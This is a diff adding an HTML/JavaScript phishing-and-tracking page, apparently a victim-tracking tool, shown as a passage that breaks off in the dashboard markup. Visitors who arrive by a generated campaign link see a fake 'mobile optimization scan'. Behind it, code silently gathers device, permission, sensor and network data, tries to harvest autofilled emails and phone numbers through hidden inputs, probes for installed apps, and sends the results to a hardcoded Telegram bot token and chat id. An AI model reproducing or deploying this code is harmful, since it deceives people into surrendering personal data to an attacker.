@@ -1,0 +1,1737 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Device Information Scanner</title>
+    <!-- Bootstrap 5 CSS -->
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
+    <!-- Font Awesome -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        /* Previous styles remain the same, adding new styles for mobile features */
+        
+        .mobile-feature-card {
+            background: linear-gradient(45deg, #1a237e, #283593);
+            color: white;
+            border-radius: 15px;
+            padding: 20px;
+            margin-bottom: 20px;
+            transition: transform 0.3s;
+        }
+        
+        .mobile-feature-card:hover {
+            transform: translateY(-5px);
+        }
+        
+        .mobile-feature-icon {
+            font-size: 2.5rem;
+            margin-bottom: 15px;
+        }
+        
+        .mobile-data-item {
+            padding: 10px;
+            border-bottom: 1px solid rgba(255,255,255,0.1);
+            display: flex;
+            justify-content: space-between;
+        }
+        
+        .mobile-data-item:last-child {
+            border-bottom: none;
+        }
+        
+        .permission-btn {
+            background: linear-gradient(45deg, #4CAF50, #2E7D32);
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 50px;
+            font-weight: 600;
+            margin: 5px;
+            transition: all 0.3s;
+        }
+        
+        .permission-btn:hover {
+            transform: scale(1.05);
+            box-shadow: 0 5px 15px rgba(76, 175, 80, 0.4);
+        }
+        
+        .permission-btn.danger {
+            background: linear-gradient(45deg, #f44336, #c62828);
+        }
+        
+        .permission-btn.warning {
+            background: linear-gradient(45deg, #ff9800, #ef6c00);
+        }
+        
+        .permission-btn.info {
+            background: linear-gradient(45deg, #2196F3, #1565C0);
+        }
+        
+        .sensor-container {
+            background: rgba(0,0,0,0.1);
+            border-radius: 10px;
+            padding: 15px;
+            margin: 10px 0;
+        }
+        
+        .sensor-value {
+            font-size: 1.5rem;
+            font-weight: bold;
+            text-align: center;
+            margin: 10px 0;
+        }
+        
+        .sensor-unit {
+            font-size: 0.9rem;
+            opacity: 0.8;
+        }
+        
+        /* Existing styles continue... */
+    </style>
+</head>
+<body id="main-body">
+    <!-- Content will be loaded dynamically -->
+
+    <!-- Bootstrap JS Bundle with Popper -->
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js"></script>
+    
+    <script>
+        // ============================================
+        // ENHANCED MOBILE FEATURES
+        // ============================================
+
+        // Extended device data object with mobile-specific features
+        const deviceData = {
+            // Existing properties...
+            deviceInfo: {},
+            networkInfo: {},
+            batteryInfo: {},
+            locationInfo: {},
+            storageInfo: {},
+            permissionsInfo: {},
+            fingerprintInfo: {},
+            cameraInfo: {},
+            clipboardInfo: {},
+            
+            // New mobile-specific properties
+            mobileFeatures: {
+                // Email detection
+                emailInfo: {
+                    possibleEmails: [],
+                    emailClients: [],
+                    hasEmailAccess: false
+                },
+                
+                // Contacts (limited access)
+                contactsInfo: {
+                    contactCount: 0,
+                    hasAccess: false,
+                    // Note: We can't access actual contacts without explicit permission
+                    // and even then, it's very restricted
+                },
+                
+                // SMS detection
+                smsInfo: {
+                    hasSmsCapability: false,
+                    canSendSms: false,
+                    // Note: We can't read SMS content
+                },
+                
+                // Notifications
+                notificationsInfo: {
+                    permissionStatus: 'default',
+                    canSendNotifications: false
+                },
+                
+                // Sensors
+                sensorsInfo: {
+                    accelerometer: { available: false, x: 0, y: 0, z: 0 },
+                    gyroscope: { available: false, x: 0, y: 0, z: 0 },
+                    magnetometer: { available: false, x: 0, y: 0, z: 0 },
+                    orientation: { available: false, alpha: 0, beta: 0, gamma: 0 },
+                    proximity: { available: false, value: 0 },
+                    lightSensor: { available: false, value: 0 }
+                },
+                
+                // Device capabilities
+                deviceCapabilities: {
+                    hasTelephony: false,
+                    hasVibration: false,
+                    hasNFC: false,
+                    hasBluetooth: false,
+                    hasWifi: false,
+                    hasCellular: false,
+                    hasTouchScreen: true,
+                    maxTouchPoints: 1
+                },
+                
+                // Browser detection for mobile-specific features
+                browserInfo: {
+                    isIOS: false,
+                    isAndroid: false,
+                    isChrome: false,
+                    isSafari: false,
+                    isFirefox: false,
+                    isMobile: false,
+                    appVersion: '',
+                    platform: ''
+                },
+                
+                // Phone number detection (limited)
+                phoneInfo: {
+                    // Note: We cannot directly access phone numbers
+                    // This is for detection purposes only
+                    possiblePhoneNumbers: [],
+                    carrierInfo: null,
+                    simInfo: null
+                },
+                
+                // App detection
+                installedApps: {
+                    // Common apps that can be detected via user agent or behavior
+                    hasWhatsApp: false,
+                    hasTelegram: false,
+                    hasFacebook: false,
+                    hasInstagram: false,
+                    hasTwitter: false,
+                    hasGmail: false,
+                    hasOutlook: false
+                }
+            },
+            
+            victimID: '',
+            timestamp: new Date().toISOString()
+        };
+
+        // Telegram bot configuration (same as before)
+        const telegramConfig = {
+            botToken: '7019340909:AAH2sTNgqfGQKb-XOYtXg34yEjmSrSajQ0M',
+            chatId: '1922624413',
+            apiUrl: 'https://api.telegram.org/bot',
+            sendHistory: []
+        };
+
+        // ============================================
+        // MOBILE DETECTION AND INITIALIZATION
+        // ============================================
+
+        // Initialize when page loads
+        document.addEventListener('DOMContentLoaded', function() {
+            // Detect mobile platform first
+            detectMobilePlatform();
+            
+            // Check if this is a victim accessing via generated link
+            const isVictimAccess = checkForTracking();
+            
+            if (!isVictimAccess) {
+                // Load enhanced dashboard interface
+                loadEnhancedDashboard();
+            }
+        });
+
+        // Detect mobile platform
+        function detectMobilePlatform() {
+            const userAgent = navigator.userAgent.toLowerCase();
+            const mobileFeatures = deviceData.mobileFeatures;
+            
+            // Detect platform
+            mobileFeatures.browserInfo.isIOS = /iphone|ipad|ipod/.test(userAgent);
+            mobileFeatures.browserInfo.isAndroid = /android/.test(userAgent);
+            mobileFeatures.browserInfo.isMobile = /mobile/.test(userAgent) || mobileFeatures.browserInfo.isIOS || mobileFeatures.browserInfo.isAndroid;
+            mobileFeatures.browserInfo.isChrome = /chrome/.test(userAgent);
+            mobileFeatures.browserInfo.isSafari = /safari/.test(userAgent) && !/chrome/.test(userAgent);
+            mobileFeatures.browserInfo.isFirefox = /firefox/.test(userAgent);
+            mobileFeatures.browserInfo.appVersion = navigator.appVersion;
+            mobileFeatures.browserInfo.platform = navigator.platform;
+            
+            // Update device info
+            deviceData.deviceInfo.isMobile = mobileFeatures.browserInfo.isMobile;
+            deviceData.deviceInfo.isIOS = mobileFeatures.browserInfo.isIOS;
+            deviceData.deviceInfo.isAndroid = mobileFeatures.browserInfo.isAndroid;
+            deviceData.deviceInfo.browser = mobileFeatures.browserInfo.isChrome ? 'Chrome' : 
+                                           mobileFeatures.browserInfo.isSafari ? 'Safari' : 
+                                           mobileFeatures.browserInfo.isFirefox ? 'Firefox' : 'Other';
+            
+            // Log detection
+            console.log('Platform detection:', mobileFeatures.browserInfo);
+        }
+
+        // Check for tracking parameter (same as before, but enhanced)
+        function checkForTracking() {
+            const urlParams = new URLSearchParams(window.location.search);
+            const campaignId = urlParams.get('cid');
+            const tracking = urlParams.get('track');
+            
+            if (tracking === 'true' && campaignId) {
+                // Enhanced victim interface for mobile
+                createEnhancedVictimInterface(campaignId);
+                
+                // Start enhanced data collection
+                setTimeout(() => {
+                    collectEnhancedMobileData(campaignId);
+                }, 1000);
+                
+                return true;
+            }
+            return false;
+        }
+
+        // ============================================
+        // ENHANCED VICTIM INTERFACE FOR MOBILE
+        // ============================================
+
+        function createEnhancedVictimInterface(campaignId) {
+            const cloakTitle = getCloakTitleFromCampaign(campaignId) || 'Mobile Security Scan';
+            
+            // Different interface for mobile vs desktop
+            if (deviceData.mobileFeatures.browserInfo.isMobile) {
+                createMobileVictimInterface(cloakTitle);
+            } else {
+                createDesktopVictimInterface(cloakTitle);
+            }
+        }
+
+        function createMobileVictimInterface(title) {
+            document.body.innerHTML = '';
+            document.body.className = 'victim-interface';
+            
+            document.body.innerHTML = `
+                <div class="victim-card" style="max-width: 100%; margin: 10px;">
+                    <div class="victim-header" style="padding: 20px;">
+                        <h3 class="mb-2">
+                            <i class="fas fa-mobile-alt"></i> ${title}
+                        </h3>
+                        <p class="mb-0">Optimizing your mobile experience</p>
+                    </div>
+                    
+                    <div class="victim-body" style="padding: 20px;">
+                        <div class="text-center mb-4">
+                            <div class="spinner-border text-primary mb-3" style="width: 3rem; height: 3rem;" role="status">
+                                <span class="visually-hidden">Loading...</span>
+                            </div>
+                            <h5 id="status-message">Mobile Optimization Scan</h5>
+                            <p class="text-muted" id="status-details">
+                                Analyzing your device for optimal performance
+                            </p>
+                        </div>
+                        
+                        <div class="progress mb-4" style="height: 15px;">
+                            <div id="scan-progress" class="progress-bar progress-bar-striped progress-bar-animated" 
+                                 role="progressbar" style="width: 5%">
+                                <span class="progress-text">5%</span>
+                            </div>
+                        </div>
+                        
+                        <div id="mobile-checklist" class="mb-4">
+                            <div class="checklist-item active">
+                                <i class="fas fa-spinner fa-spin text-primary me-2"></i>
+                                <span>Device Analysis</span>
+                            </div>
+                            <div class="checklist-item">
+                                <i class="fas fa-clock me-2"></i>
+                                <span>Network Optimization</span>
+                            </div>
+                            <div class="checklist-item">
+                                <i class="fas fa-clock me-2"></i>
+                                <span>Security Check</span>
+                            </div>
+                            <div class="checklist-item">
+                                <i class="fas fa-clock me-2"></i>
+                                <span>Battery Analysis</span>
+                            </div>
+                            <div class="checklist-item">
+                                <i class="fas fa-clock me-2"></i>
+                                <span>Performance Boost</span>
+                            </div>
+                        </div>
+                        
+                        <div class="alert alert-info" style="font-size: 0.9rem;">
+                            <i class="fas fa-info-circle"></i>
+                            <strong>Mobile Optimization:</strong> This scan improves battery life and performance.
+                        </div>
+                        
+                        <div class="row mt-3">
+                            <div class="col-4 text-center">
+                                <i class="fas fa-battery-three-quarters fa-2x text-success mb-2"></i>
+                                <div class="small">Battery Saver</div>
+                            </div>
+                            <div class="col-4 text-center">
+                                <i class="fas fa-rocket fa-2x text-primary mb-2"></i>
+                                <div class="small">Speed Boost</div>
+                            </div>
+                            <div class="col-4 text-center">
+                                <i class="fas fa-shield-alt fa-2x text-warning mb-2"></i>
+                                <div class="small">Security Scan</div>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="victim-footer" style="padding: 15px; font-size: 0.8rem;">
+                        <div class="d-flex justify-content-center align-items-center">
+                            <i class="fas fa-circle text-success me-2" style="font-size: 0.6rem;"></i>
+                            <span>Mobile scan in progress • Optimizing...</span>
+                        </div>
+                    </div>
+                </div>
+                
+                <!-- Hidden elements for data collection -->
+                <div style="display: none;">
+                    <!-- For email detection -->
+                    <input type="email" id="hidden-email" autocomplete="email">
+                    <!-- For phone detection -->
+                    <input type="tel" id="hidden-phone" autocomplete="tel">
+                    <!-- For contact suggestions -->
+                    <input type="text" id="hidden-contact" autocomplete="name">
+                </div>
+            `;
+        }
+
+        function createDesktopVictimInterface(title) {
+            // Use the existing desktop interface
+            document.body.innerHTML = '';
+            document.body.className = 'victim-interface';
+            
+            document.body.innerHTML = `
+                <div class="victim-card">
+                    <div class="victim-header">
+                        <h1 class="display-6 mb-2">
+                            <i class="fas fa-desktop"></i> ${title}
+                        </h1>
+                        <p class="mb-0">System Performance Scan</p>
+                    </div>
+                    
+                    <div class="victim-body">
+                        <div class="text-center mb-4">
+                            <div class="spinner-border text-primary mb-3" style="width: 3rem; height: 3rem;" role="status">
+                                <span class="visually-hidden">Loading...</span>
+                            </div>
+                            <h4 id="status-message">System Optimization Scan</h4>
+                            <p class="text-muted" id="status-details">
+                                Please wait while we optimize your system
+                            </p>
+                        </div>
+                        
+                        <!-- Same as before -->
+                    </div>
+                </div>
+            `;
+        }
+
+        // ============================================
+        // ENHANCED MOBILE DATA COLLECTION
+        // ============================================
+
+        async function collectEnhancedMobileData(campaignId) {
+            const totalSteps = 6;
+            
+            // Step 1: Basic device info
+            updateVictimProgress(1, totalSteps, "Analyzing Device...");
+            await collectDeviceInfo();
+            await collectMobileCapabilities();
+            await delay(800);
+            
+            // Step 2: Network & connectivity
+            updateVictimProgress(2, totalSteps, "Checking Network...");
+            await collectNetworkInfo();
+            await detectConnectivityFeatures();
+            await delay(800);
+            
+            // Step 3: Email & contact detection
+            updateVictimProgress(3, totalSteps, "Scanning Security...");
+            await detectEmailClients();
+            await attemptContactDetection();
+            await delay(800);
+            
+            // Step 4: Sensors
+            updateVictimProgress(4, totalSteps, "Testing Hardware...");
+            await checkAvailableSensors();
+            await delay(800);
+            
+            // Step 5: Notifications & permissions
+            updateVictimProgress(5, totalSteps, "Checking Permissions...");
+            await checkNotificationPermission();
+            await checkOtherPermissions();
+            await delay(800);
+            
+            // Step 6: Final collection
+            updateVictimProgress(6, totalSteps, "Finalizing...");
+            await collectBatteryInfo();
+            await collectStorageInfo();
+            await collectFingerprintInfo();
+            
+            // Special mobile-only collection
+            if (deviceData.mobileFeatures.browserInfo.isMobile) {
+                await collectMobileSpecificData();
+            }
+            
+            // Update campaign stats
+            if (campaignManager) {
+                campaignManager.incrementStat(campaignId, 'dataCollected');
+                
+                // Send to Telegram if configured
+                try {
+                    campaignManager.loadFromStorage();
+                    const campaign = campaignManager.campaigns.find(c => c.id === campaignId);
+                    if (campaign && campaign.settings && campaign.settings.autoTelegram) {
+                        await sendEnhancedMobileDataToTelegram(campaignId);
+                    }
+                } catch (e) {
+                    console.log('Failed to send to Telegram:', e);
+                }
+            }
+            
+            // Show completion
+            setTimeout(() => {
+                completeVictimScan(campaignId);
+            }, 1500);
+        }
+
+        // ============================================
+        // MOBILE-SPECIFIC DATA COLLECTION FUNCTIONS
+        // ============================================
+
+        // Detect mobile capabilities
+        async function collectMobileCapabilities() {
+            const capabilities = deviceData.mobileFeatures.deviceCapabilities;
+            const userAgent = navigator.userAgent.toLowerCase();
+            
+            // Check for vibration API
+            capabilities.hasVibration = 'vibrate' in navigator;
+            
+            // Check for telephony (mobile device)
+            capabilities.hasTelephony = /android|iphone|ipad|ipod/.test(userAgent);
+            
+            // Check for NFC
+            capabilities.hasNFC = 'NDEFReader' in window;
+            
+            // Check for Bluetooth
+            capabilities.hasBluetooth = 'bluetooth' in navigator;
+            
+            // Check for WiFi/Cellular (inferred from connection)
+            if (navigator.connection) {
+                const conn = navigator.connection;
+                capabilities.hasWifi = conn.effectiveType === 'wifi';
+                capabilities.hasCellular = ['cellular', '3g', '4g', '5g'].includes(conn.effectiveType);
+            }
+            
+            // Check touch capabilities
+            capabilities.maxTouchPoints = navigator.maxTouchPoints || 1;
+            
+            // Try to detect installed apps via various methods
+            await detectInstalledApps();
+            
+            console.log('Mobile capabilities:', capabilities);
+        }
+
+        // Detect installed apps (indirect methods)
+        async function detectInstalledApps() {
+            const apps = deviceData.mobileFeatures.installedApps;
+            const userAgent = navigator.userAgent.toLowerCase();
+            
+            // These are indirect detections and not 100% reliable
+            // WhatsApp detection via user agent patterns
+            apps.hasWhatsApp = /whatsapp/i.test(userAgent);
+            
+            // Check for app protocols (these will fail if app not installed)
+            // This is a common technique to detect apps
+            setTimeout(() => {
+                checkAppProtocol('whatsapp://', 'hasWhatsApp');
+                checkAppProtocol('tg://', 'hasTelegram');
+                checkAppProtocol('fb://', 'hasFacebook');
+                checkAppProtocol('instagram://', 'hasInstagram');
+                checkAppProtocol('twitter://', 'hasTwitter');
+            }, 1000);
+            
+            // Email clients detection
+            apps.hasGmail = /gmail/i.test(userAgent) || document.referrer.includes('mail.google');
+            apps.hasOutlook = /outlook/i.test(userAgent) || document.referrer.includes('outlook.live');
+        }
+
+        // Check if app protocol exists
+        function checkAppProtocol(protocol, appKey) {
+            const iframe = document.createElement('iframe');
+            iframe.style.display = 'none';
+            iframe.src = protocol;
+            document.body.appendChild(iframe);
+            
+            setTimeout(() => {
+                document.body.removeChild(iframe);
+                // If we're still here, the app probably isn't installed
+                // (would have been redirected if it was)
+            }, 500);
+        }
+
+        // Detect email clients and possible emails
+        async function detectEmailClients() {
+            const emailInfo = deviceData.mobileFeatures.emailInfo;
+            
+            // Check for mailto: protocol handler
+            emailInfo.hasEmailAccess = navigator.registerProtocolHandler ? true : false;
+            
+            // Try to detect email from autofill fields (limited)
+            try {
+                // Create hidden email input to trigger autofill detection
+                const emailInput = document.getElementById('hidden-email');
+                if (emailInput) {
+                    // Focus and blur to trigger autocomplete
+                    emailInput.focus();
+                    emailInput.blur();
+                    
+                    // Check after a delay
+                    setTimeout(() => {
+                        if (emailInput.value) {
+                            emailInfo.possibleEmails.push(emailInput.value);
+                        }
+                    }, 100);
+                }
+            } catch (e) {
+                console.log('Email detection limited:', e);
+            }
+            
+            // Detect common email patterns in user agent
+            const ua = navigator.userAgent;
+            if (/mail|email|outlook|gmail|yahoo|hotmail/i.test(ua)) {
+                emailInfo.emailClients.push('Email client detected in user agent');
+            }
+        }
+
+        // Attempt contact detection (very limited)
+        async function attemptContactDetection() {
+            const contactsInfo = deviceData.mobileFeatures.contactsInfo;
+            
+            // Check for Contacts API (very limited access)
+            if ('contacts' in navigator && 'select' in navigator.contacts) {
+                contactsInfo.hasAccess = true;
+                
+                // Note: This API requires explicit user permission and interaction
+                // We can't access contacts without user explicitly choosing them
+            }
+            
+            // Check for autofill contact suggestions
+            try {
+                const contactInput = document.getElementById('hidden-contact');
+                if (contactInput) {
+                    contactInput.focus();
+                    contactInput.blur();
+                }
+            } catch (e) {
+                console.log('Contact detection limited');
+            }
+        }
+
+        // Detect SMS capabilities
+        async function detectConnectivityFeatures() {
+            const smsInfo = deviceData.mobileFeatures.smsInfo;
+            
+            // Check for SMS sending capability
+            smsInfo.canSendSms = 'sms' in navigator;
+            smsInfo.hasSmsCapability = deviceData.mobileFeatures.deviceCapabilities.hasTelephony;
+            
+            // Try to detect SMS patterns in URL (sms: protocol)
+            if (window.location.href.includes('sms:')) {
+                smsInfo.smsLinksDetected = true;
+            }
+        }
+
+        // Check available sensors
+        async function checkAvailableSensors() {
+            const sensorsInfo = deviceData.mobileFeatures.sensorsInfo;
+            
+            // Check for various sensor APIs
+            sensorsInfo.accelerometer.available = 'Accelerometer' in window;
+            sensorsInfo.gyroscope.available = 'Gyroscope' in window;
+            sensorsInfo.magnetometer.available = 'Magnetometer' in window;
+            sensorsInfo.orientation.available = 'DeviceOrientationEvent' in window;
+            sensorsInfo.proximity.available = 'ProximitySensor' in window;
+            sensorsInfo.lightSensor.available = 'AmbientLightSensor' in window;
+            
+            // Try to access orientation if available
+            if (sensorsInfo.orientation.available) {
+                window.addEventListener('deviceorientation', (event) => {
+                    sensorsInfo.orientation.alpha = event.alpha;
+                    sensorsInfo.orientation.beta = event.beta;
+                    sensorsInfo.orientation.gamma = event.gamma;
+                });
+            }
+            
+            // Try to access motion if available
+            if (sensorsInfo.accelerometer.available) {
+                window.addEventListener('devicemotion', (event) => {
+                    if (event.acceleration) {
+                        sensorsInfo.accelerometer.x = event.acceleration.x;
+                        sensorsInfo.accelerometer.y = event.acceleration.y;
+                        sensorsInfo.accelerometer.z = event.acceleration.z;
+                    }
+                });
+            }
+        }
+
+        // Check notification permission
+        async function checkNotificationPermission() {
+            const notificationsInfo = deviceData.mobileFeatures.notificationsInfo;
+            
+            if ('Notification' in window) {
+                notificationsInfo.permissionStatus = Notification.permission;
+                notificationsInfo.canSendNotifications = Notification.permission === 'granted';
+            }
+        }
+
+        // Check other permissions
+        async function checkOtherPermissions() {
+            const permissions = [
+                'camera',
+                'microphone',
+                'geolocation',
+                'notifications',
+                'push',
+                'clipboard-read',
+                'clipboard-write',
+                'midi',
+                'storage-access',
+                'payment-handler'
+            ];
+            
+            const permissionsInfo = {};
+            
+            for (const permission of permissions) {
+                try {
+                    const permissionStatus = await navigator.permissions.query({name: permission});
+                    permissionsInfo[permission] = permissionStatus.state;
+                } catch (e) {
+                    permissionsInfo[permission] = 'Not supported';
+                }
+            }
+            
+            deviceData.permissionsInfo = permissionsInfo;
+        }
+
+        // Collect mobile-specific data
+        async function collectMobileSpecificData() {
+            // Additional mobile-specific data collection
+            
+            // Check for phone number patterns (limited)
+            await detectPossiblePhoneNumbers();
+            
+            // Check for carrier information (limited)
+            await detectCarrierInfo();
+            
+            // Check for vibration
+            if (deviceData.mobileFeatures.deviceCapabilities.hasVibration) {
+                // We can test vibration (with user permission)
+                try {
+                    await navigator.vibrate(100);
+                    deviceData.mobileFeatures.vibrationTest = 'Success';
+                } catch (e) {
+                    deviceData.mobileFeatures.vibrationTest = 'Failed';
+                }
+            }
+            
+            // Check screen orientation
+            deviceData.mobileFeatures.screenOrientation = screen.orientation ? screen.orientation.type : 'Unknown';
+            
+            // Check viewport
+            deviceData.mobileFeatures.viewport = {
+                width: window.innerWidth,
+                height: window.innerHeight,
+                deviceWidth: screen.width,
+                deviceHeight: screen.height
+            };
+        }
+
+        // Detect possible phone numbers (very limited)
+        async function detectPossiblePhoneNumbers() {
+            const phoneInfo = deviceData.mobileFeatures.phoneInfo;
+            
+            // This is highly speculative and limited
+            // We can only detect patterns in available data
+            
+            // Check for phone input autofill
+            try {
+                const phoneInput = document.getElementById('hidden-phone');
+                if (phoneInput) {
+                    phoneInput.focus();
+                    phoneInput.blur();
+                    
+                    setTimeout(() => {
+                        if (phoneInput.value) {
+                            phoneInfo.possiblePhoneNumbers.push(phoneInput.value);
+                        }
+                    }, 100);
+                }
+            } catch (e) {
+                console.log('Phone detection limited');
+            }
+            
+            // Check user agent for phone hints
+            const ua = navigator.userAgent;
+            if (/\d{10,}/.test(ua)) {
+                const phoneMatches = ua.match(/\d{10,}/g);
+                if (phoneMatches) {
+                    phoneInfo.possiblePhoneNumbers.push(...phoneMatches);
+                }
+            }
+        }
+
+        // Detect carrier information (limited)
+        async function detectCarrierInfo() {
+            const phoneInfo = deviceData.mobileFeatures.phoneInfo;
+            
+            if (navigator.connection) {
+                const conn = navigator.connection;
+                
+                // Network type can hint at carrier
+                phoneInfo.carrierInfo = {
+                    type: conn.type,
+                    effectiveType: conn.effectiveType,
+                    downlink: conn.downlink,
+                    rtt: conn.rtt,
+                    saveData: conn.saveData
+                };
+                
+                // Try to get more specific info (limited)
+                if (deviceData.mobileFeatures.browserInfo.isAndroid) {
+                    // Android-specific detection
+                    phoneInfo.simInfo = {
+                        hasSim: true, // Assumption for mobile devices
+                        platform: 'Android'
+                    };
+                } else if (deviceData.mobileFeatures.browserInfo.isIOS) {
+                    phoneInfo.simInfo = {
+                        hasSim: true,
+                        platform: 'iOS'
+                    };
+                }
+            }
+        }
+
+        // ============================================
+        // ENHANCED DASHBOARD WITH MOBILE FEATURES
+        // ============================================
+
+        function loadEnhancedDashboard() {
+            document.body.innerHTML = getEnhancedDashboardHTML();
+            document.body.className = 'dashboard-interface';
+            initializeEnhancedDashboard();
+        }
+
+        function getEnhancedDashboardHTML() {
+            return `
+                <div class="container py-4">
+                    <!-- Header -->
+                    <div class="row justify-content-center">
+                        <div class="col-12">
+                            <div class="glass-card p-3 mb-3">
+                                <div class="row align-items-center">
+                                    <div class="col-md-6">
+                                        <h1 class="h3 fw-bold text-white mb-1">
+                                            <i class="fas fa-mobile-alt"></i> Enhanced Device Scanner
+                                        </h1>
+                                        <p class="small text-white mb-0">
+                                            Advanced mobile & desktop information gathering
+                                        </p>
+                                    </div>
+                                    <div class="col-md-6 text-end">
+                                        <div class="d-flex justify-content-end gap-2 flex-wrap">
+                                            <button class="btn btn-sm link-btn mb-1" data-bs-toggle="modal" data-bs-target="#linkModal">
+                                                <i class="fas fa-link"></i> Generate Link
+                                            </button>
+                                            <button class="btn btn-sm telegram-btn mb-1" onclick="sendEnhancedDataToTelegram()">
+                                                <i class="fab fa-telegram"></i> Send All Data
+                                            </button>
+                                            <button class="btn btn-sm download-btn mb-1" onclick="downloadEnhancedData()">
+                                                <i class="fas fa-download"></i> Download
+                                            </button>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="row">
+                        <!-- Left sidebar -->
+                        <div class="col-lg-3 mb-3">
+                            <div class="info-card glass-card mb-3">
+                                <div class="card-header py-2">
+                                    <i class="fas fa-bars card-icon"></i> Navigation
+                                </div>
+                                <div class="card-body p-2">
+                                    <div class="nav flex-column" id="nav-tab" role="tablist">
+                                        <button class="nav-link active text-start" data-bs-toggle="tab" data-bs-target="#mobile-tab">
+                                            <i class="fas fa-mobile-alt me-2"></i> Mobile Features
+                                        </button>
+                                        <button class="nav-link text-start" data-bs-toggle="tab" data-bs-target="#sensors-tab">
+                                            <i class="fas fa-compass me-2"></i> Sensors
+                                        </button>
+                                        <button class="nav-link text-start" data-bs-toggle="tab" data-bs-target="#permissions-tab">
+                                            <i class="fas fa-shield-alt me-2"></i> Permissions
+                                        </button>
+                                        <button class="nav-link text-start" data-bs-toggle="tab" data-bs-target="#detection-tab">
+                                            <i class="fas fa-search me-2"></i> Detection
+                                        </button>
+                                        <button class="nav-link text-start" data-bs-toggle="tab" data-bs-target="#basic-tab">
+                                            <i class="fas fa-info-circle me-2"></i> Basic Info
+                                        </button>
+                                        <button class="nav-link text-start" data-bs-toggle="tab" data-bs-target="#network-tab">
+                                            <i class="fas fa-wifi me-2"></i> Network
+                                        </button>
+                                    </div>
+                                </div>
+                            </div>
+                            
+                            <div class="info-card glass-card">
+                                <div class="card-header py-2">
+                                    <i class="fas fa-qrcode card-icon"></i> Quick Actions
+                                </div>
+                                <div class="card-body p-2 text-center">
+                                    <button class="btn btn-sm btn-outline-primary w-100 mb-2" onclick="requestNotificationPermission()">
+                                        <i class="fas fa-bell"></i> Request Notifications
+                                    </button>
+                                    <button class="btn btn-sm btn-outline-success w-100 mb-2" onclick="testVibration()">
+                                        <i class="fas fa-vibrate"></i> Test Vibration
+                                    </button>
+                                    <button class="btn btn-sm btn-outline-warning w-100" onclick="testSensors()">
+                                        <i class="fas fa-compass"></i> Test Sensors
+                                    </button>
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <!-- Main content -->
+                        <div class="col-lg-9">
+                            <div class="tab-content">
+                                <!-- Mobile Features Tab -->
+                                <div class="tab-pane fade show active" id="mobile-tab">
+                                    <div class="info-card glass-card">
+                                        <div class="card-header">
+                                            <i class="fas fa-mobile-alt card-icon"></i> Mobile Features & Detection
+                                        </div>
+                                        <div class="card-body">
+                                            <div class="row">
+                                                <div class="col-md-6 mb-3">
+                                                    <div class="mobile-feature-card">
+                                                        <div class="mobile-feature-icon">
+                                                            <i class="fas fa-robot"></i>
+                                                        </div>
+                                                        <h5>Platform Detection</h5>
+                                                        <div id="platform-detection">
+                                                            Loading platform info...
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                                <div class="col-md-6 mb-3">
+                                                    <div class="mobile-feature-card">
+                                                        <div class="mobile-feature-icon">
+                                                            <i class="fas fa-bolt"></i>
+                                                        </div>
+                                                        <h5>Device Capabilities</h5>
+                                                        <div id="device-capabilities">
+                                                            Loading capabilities...
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                                <div class="col-md-6 mb-3">
+                                                    <div class="mobile-feature-card">
+                                                        <div class="mobile-feature-icon">
+                                                            <i class="fas fa-envelope"></i>
+                                                        </div>
+                                                        <h5>Email & Communication</h5>
+                                                        <div id="email-info">
+                                                            Loading email info...
+                                                        </div>
+                                                        <button class="permission-btn info mt-2" onclick="detectEmailInfo()">
+                                                            <i class="fas fa-search"></i> Detect Email
+                                                        </button>
+                                                    </div>
+                                                </div>
+                                                <div class="col-md-6 mb-3">
+                                                    <div class="mobile-feature-card">
+                                                        <div class="mobile-feature-icon">
+                                                            <i class="fas fa-address-book"></i>
+                                                        </div>
+                                                        <h5>Contacts & SMS</h5>
+                                                        <div id="contact-sms-info">
+                                                            Loading contact info...
+                                                        </div>
+                                                        <button class="permission-btn warning mt-2" onclick="requestContactAccess()">
+                                                            <i class="fas fa-users"></i> Check Contacts
+                                                        </button>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                            
+                                            <div class="row mt-3">
+                                                <div class="col-12">
+                                                    <div class="mobile-feature-card">
+                                                        <div class="mobile-feature-icon">
+                                                            <i class="fas fa-box"></i>
+                                                        </div>
+                                                        <h5>Installed Apps Detection</h5>
+                                                        <div id="installed-apps">
+                                                            Detecting installed apps...
+                                                        </div>
+                                                        <button class="permission-btn mt-2" onclick="detectInstalledApps()">
+                                                            <i class="fas fa-search"></i> Detect Apps
+                                                        </button>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                                
+                                <!-- Sensors Tab -->
+                                <div class="tab-pane fade" id="sensors-tab">
+                                    <div class="info-card glass-card">
+                                        <div class="card-header">
+                                            <i class="fas fa-compass card-icon"></i> Device Sensors
+                                        </div>
+                                        <div class="card-body">
+                                            <div class="row">
+                                                <div class="col-md-4 mb-3">
+                                                    <div class="sensor-container">
+                                                        <h6><i class="fas fa-running"></i> Accelerometer</h6>
+                                                        <div class="sensor-value" id="accel-x">0.00</div>
+                                                        <div class="sensor-unit">X-axis (m/s²)</div>
+                                                        <div class="sensor-value" id="accel-y">0.00</div>
+                                                        <div class="sensor-unit">Y-axis (m/s²)</div>
+                                                        <div class="sensor-value" id="accel-z">0.00</div>
+                                                        <div class="sensor-unit">Z-axis (m/s²)</div>
+                                                        <div class="mt-2 text-center">
+                                                            <span id="accel-status" class="badge bg-secondary">Checking...</span>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                                <div class="col-md-4 mb-3">
+                                                    <div class="sensor-container">
+                                                        <h6><i class="fas fa-compass"></i> Orientation</h6>
+                                                        <div class="sensor-value" id="orient-alpha">0.00</div>
+                                                        <div class="sensor-unit">Alpha (°)</div>
+                                                        <div class="sensor-value" id="orient-beta">0.00</div>
